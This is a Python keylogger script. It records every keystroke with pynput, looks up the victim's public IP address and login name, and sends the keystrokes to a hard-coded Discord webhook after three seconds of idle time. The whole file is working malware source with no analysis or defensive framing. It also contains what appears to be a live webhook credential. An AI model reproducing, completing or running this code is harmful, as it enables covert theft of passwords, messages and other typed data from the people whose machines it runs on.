import os
import requests
import threading
import time
from pynput import keyboard

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: " SPACE ",
    keyboard.Key.enter: " ENTER ",
    keyboard.Key.backspace: " BACKSPACE ",
    keyboard.Key.tab: " TAB ",
    keyboard.Key.shift: " SHIFT ",
    keyboard.Key.ctrl_l: " CTRL ",
    keyboard.Key.alt_l: " ALT ",
    keyboard.Key.cmd: " CMD ",
    keyboard.Key.esc: " ESC ",
}

def get_public_ip():
    """Fetch the public IP address using an external API."""
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get("ip")
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error getting public IP address: {e}")
        return "Unknown"

def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""

def on_press(key):
    global keystrokes, last_keypress_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = special_keys.get(key, f"[{key}]")
    
    with lock:
        keystrokes += key_str
        last_keypress_time = time.time()

def on_release(key):
    if key == keyboard.Key.insert:
        send_to_webhook(f"Connection stopped by user: {username}")
        file_path = r"C:\Users\{username}\kl2.1"  # Fixed the file path
        os.startfile(file_path)
        send_to_webhook(f"Opened dir...")
        return False

# Get and send public IP and username
username = os.getlogin()
public_ip = get_public_ip()
send_to_webhook(f"Connection established. Public IP address: {public_ip}")
send_to_webhook(f"Current user: {username}")

# Start the keystroke monitor thread
threading.Thread(target=keystroke_monitor, daemon=True).start()

# Set up the keyboard listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Listener stopped.")
